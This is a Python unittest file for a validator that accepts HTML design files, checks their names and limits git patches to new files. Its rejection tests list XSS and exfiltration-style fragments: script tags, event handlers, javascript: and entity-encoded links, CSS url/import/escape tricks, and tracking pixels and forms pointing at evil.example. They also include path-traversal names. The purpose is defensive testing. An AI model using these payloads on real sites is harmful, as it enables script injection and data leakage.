import unittest

from factory.designfiles import (DesignFileRejected, MAX_BYTES, check_name, check_patch_adds_only, validate_html)

VALID = '''<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <script src="./support.js"></script>
</head>
<body>
<x-dc>
<helmet>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Spline+Sans:wght@400;700&display=swap">
  <style>
    body { margin: 0; font-family: 'Spline Sans', ui-sans-serif, system-ui, sans-serif; }
    a { color: #4C6EF5; text-decoration: none; }
  </style>
</helmet>
<div style="width: 1184px; box-sizing: border-box; background: #FFFBF5; color: #241E1A; padding: 24px;">
  <h1 style="margin: 0; font-size: 30px;">Settings</h1>
  <p>Three things you can change. <a href="#">Do the same here</a></p>
  <span style="display: inline-flex; border-radius: 16px; border: 1px solid #E8DFD3;">Change</span>
  <svg width="16" height="16" viewBox="0 0 16 16"><path d="M2 8h12" stroke="#000" fill="none"/></svg>
  <button>Save</button> <input placeholder="Name" value="Sam">
</div>
</x-dc>
</body>
</html>'''


def evil(fragment: str) -> str:
    return VALID.replace("<h1", fragment + "<h1", 1)


class Validator(unittest.TestCase):
    def test_a_canvas_like_the_existing_ones_is_accepted(self):
        validate_html(VALID)

    def test_everything_that_could_run_code_or_phone_home_is_rejected(self):
        hostile = {
            "inline script": "<script>alert(1)</script>",
            "remote script": '<script src="https://evil.example/x.js"></script>',
            "support.js with a payload": '<script src="./support.js">alert(1)</script>',
            "event handler": '<div onclick="alert(1)">x</div>',
            "handler on svg": '<svg onload="alert(1)"></svg>',
            "img": '<img src="x" onerror="alert(1)">',
            "tracking pixel": '<img src="https://evil.example/p.png">',
            "iframe": '<iframe src="https://evil.example"></iframe>',
            "object": '<object data="x"></object>',
            "embed": '<embed src="x">',
            "form": '<form action="https://evil.example"><input></form>',
            "base": '<base href="https://evil.example/">',
            "meta refresh": '<meta http-equiv="refresh" content="0;url=https://evil.example">',
            "remote stylesheet": '<link rel="stylesheet" href="https://evil.example/x.css">',
            "javascript link": '<a href="javascript:alert(1)">x</a>',
            "entity-hidden javascript link": '<a href="&#106;avascript:alert(1)">x</a>',
            "external link": '<a href="https://evil.example">x</a>',
            "css url in style attr": '<div style="background:url(https://evil.example/x)">x</div>',
            "css import": "<style>@import url('https://evil.example/x.css');</style>",
            "css url in style tag": "<style>div{background:url(https://evil.example/x)}</style>",
            "css escape": "<style>div{background:\\75rl(https://evil.example/x)}</style>",
            "css expression": '<div style="width:expression(alert(1))">x</div>',
            "svg use": '<svg><use href="https://evil.example/s.svg#a"></use></svg>',
            "formaction": '<button formaction="https://evil.example">x</button>',
            "srcdoc": '<div srcdoc="x">x</div>',
            "video": '<video src="x"></video>',
            "unknown element": "<marquee>x</marquee>",
        }
        for name, frag in hostile.items():
            with self.assertRaises(DesignFileRejected, msg=name):
                validate_html(evil(frag))

    def test_structure_and_size_rules(self):
        for bad in (VALID.replace("<!doctype html>", ""), VALID.replace("<x-dc>", "<div>").replace("</x-dc>", "</div>"),
                    VALID + "<?php echo 1 ?>", VALID.replace("<!doctype html>", "<!doctype html SYSTEM 'x'>"),
                    VALID + "\x00", VALID.replace("</div>", "x" * MAX_BYTES + "</div>")):
            with self.assertRaises(DesignFileRejected):
                validate_html(bad)


class Names(unittest.TestCase):
    def test_name_pattern_and_ticket_number(self):
        check_name("design/factory-975-proration-basis.dc.html", 975)
        for bad in ("design/factory-976-x.dc.html", "design/x.dc.html", "design/factory-975-.dc.html", "design/factory-975-X.dc.html",
                    "design/sub/factory-975-x.dc.html", "../design/factory-975-x.dc.html", "design/factory-975-x.html",
                    "design/factory-975-" + "a" * 60 + ".dc.html", "web/design/factory-975-x.dc.html"):
            with self.assertRaises(DesignFileRejected, msg=bad):
                check_name(bad, 975)


def added(path, extra=""):
    return f"diff --git a/{path} b/{path}\nnew file mode 100644\nindex 0000000..1111111\n--- /dev/null\n+++ b/{path}\n@@ -0,0 +1 @@\n+x\n{extra}"


class PatchRules(unittest.TestCase):
    def test_only_brand_new_regular_files_with_good_names_are_accepted(self):
        ok = added("design/factory-5-a.dc.html") + added("design/factory-5-b.dc.html")
        self.assertEqual(check_patch_adds_only(ok, 5), ["design/factory-5-a.dc.html", "design/factory-5-b.dc.html"])

    def test_edits_deletes_renames_modes_and_extra_files_are_rejected(self):
        modify = "diff --git a/design/factory-5-a.dc.html b/design/factory-5-a.dc.html\nindex 1..2 100644\n--- a/design/factory-5-a.dc.html\n+++ b/design/factory-5-a.dc.html\n@@ -1 +1 @@\n-a\n+b\n"
        delete = "diff --git a/design/factory-5-a.dc.html b/design/factory-5-a.dc.html\ndeleted file mode 100644\nindex 1..0\n"
        rename = "diff --git a/design/factory-5-a.dc.html b/design/factory-5-b.dc.html\nsimilarity index 100%\nrename from design/factory-5-a.dc.html\nrename to design/factory-5-b.dc.html\n"
        exe = added("design/factory-5-a.dc.html").replace("100644", "100755")
        for name, bad in (("modify", modify), ("delete", delete), ("rename", rename), ("exec", exe), ("canvas.json", added("design/canvas.json")),
                          ("existing-style name", added("design/Main.dc.html")), ("other dir", added("web/src/x.ts")),
                          ("empty", ""), ("too many", "".join(added(f"design/factory-5-{c}.dc.html") for c in "abcd")),
                          ("symlink", added("design/factory-5-a.dc.html").replace("100644", "120000"))):
            with self.assertRaises(DesignFileRejected, msg=name):
                check_patch_adds_only(bad, 5)
        with self.assertRaises(DesignFileRejected):
            check_patch_adds_only(added("design/factory-5-a.dc.html"), 6)             # a different ticket's number


if __name__ == "__main__":
    unittest.main()
